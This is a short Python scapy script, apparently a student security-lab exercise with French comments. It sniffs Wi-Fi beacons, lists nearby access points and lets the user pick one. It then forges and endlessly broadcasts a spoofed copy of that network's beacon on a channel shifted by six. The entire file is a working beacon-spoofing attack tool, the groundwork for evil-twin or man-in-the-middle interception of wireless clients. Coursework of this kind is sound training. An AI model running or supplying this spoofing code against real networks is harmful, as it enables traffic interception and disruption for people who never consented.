# Auteurs    : Dylan Canton & Christian Zaccaria
# Date       : 23.03.2022
# Descriptif : Script permettant de récupérer les SSID et proposer à l'utilisateur d'en choisir un
#              pour forger un beacon similaire (différence de channel de 6 canaux)
# Source     : https://pypi.org/project/texttable/
#              https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
#              https://www.binarytides.com/python-packet-sniffer-code-linux/


from scapy.all import *
import texttable as text_t

bssid_list = []
pkt_list = []
ap_list = []

# Affichage des informations sous forme de tableau
def display_texttable(list):
    table = text_t.Texttable()
    table.set_deco(text_t.Texttable.HEADER)
    table.set_cols_dtype(['i','t','t','t','t']) 
    table.set_cols_align(["l", "l", "l", "l", "l"])
    table.add_row(["No", "BSSID", "SSID", "Channel", "Strength"])

    i = 0
    for info in list:
        i += 1
        table.add_row([i, info[0], info[1], info[2], info[3]])
    print(table.draw())

# Recherche d'un paquet Beacon afin de pouvoir extraire les informations nécessaires
def SSID_finder(pkt):
    #check que la trame est de type "beacon"
    if pkt.haslayer(Dot11Beacon):
        #type doit être 0 et subtype 8 obligatoirement
        if pkt.type == 0 and pkt.subtype == 8:
            #check si on a déjà checker le bssid (autrement on fait rien)
            if pkt.getlayer(Dot11).addr2 not in bssid_list:
                ssid = pkt.getlayer(Dot11Elt).info.decode("utf-8")
                #check si pas un réseau caché
                if ssid == '':
                    ssid = "Masked Network"

                #recupération de la puissance et du canal
                try:
                    #puissance émise
                    radiotap = pkt.getlayer(RadioTap)
                    rssi = radiotap.dBm_AntSignal
                    #canal d'émission
                    channel = pkt[Dot11Elt][2].info
                    channel = int.from_bytes(channel, byteorder='big')
                #si on recupère rien, on fixe une valeur
                except:
                    rssi = "unknown"
                    channel = "unknown"

                #on ajoute dans les informations trouvés dans les listes
                bssid_list.append(pkt.getlayer(Dot11).addr2)
                pkt_list.append(pkt)
                ap_list.append([pkt.getlayer(Dot11).addr2, ssid, channel, rssi])


# Forge un faux beacon ayant un canal différent (6 de différence)
def forge_beacon(pkt):
    NB_CHANNELS = 13
    #check que la trame est de type "beacon"
    if pkt.haslayer(Dot11Beacon):
        #type doit être 0 et subtype 8 obligatoirement
        if pkt.type == 0 and pkt.subtype == 8:
            beacon = pkt
            #nouveau canal (avec 6 de différence)
            #on utilise le modulo 13 pour ne choisir que parmis les 13 canaux disponibles
            channel = ((int.from_bytes(pkt[Dot11Elt][2].info, byteorder='big')+ 5) % NB_CHANNELS) + 1
            #création d'un nouveau paquet en ne prenant uniquement la fin de dernier
            #le reste des layers ne nous sert pas car ils seront supprimé avec l'envoi du nouveau beacon
            pkt_part = beacon[Dot11Elt][3]
            #changement du canal
            beacon[Dot11Elt:3] = Dot11Elt(ID="DSset", len=len(channel.to_bytes(1, 'big')), info=(channel.to_bytes(1, 'big')))
            #on ajoute la fin du paquet que l'on a modifié
            beacon_send = beacon/pkt_part
            #envoi du nouveau paquet
            sendp(beacon_send, iface=interface_to_check, loop=1)


interface_to_check = input("Nom de l'interface : ")
print("Interface selectionnée : " + interface_to_check)
sniff(iface=interface_to_check , prn=SSID_finder, timeout=10)
display_texttable(ap_list)

SSID_select = input("Numero du SSID à modifier : ")
print("No choisi : " + SSID_select)
forge_beacon(pkt_list[int(SSID_select)-1])	
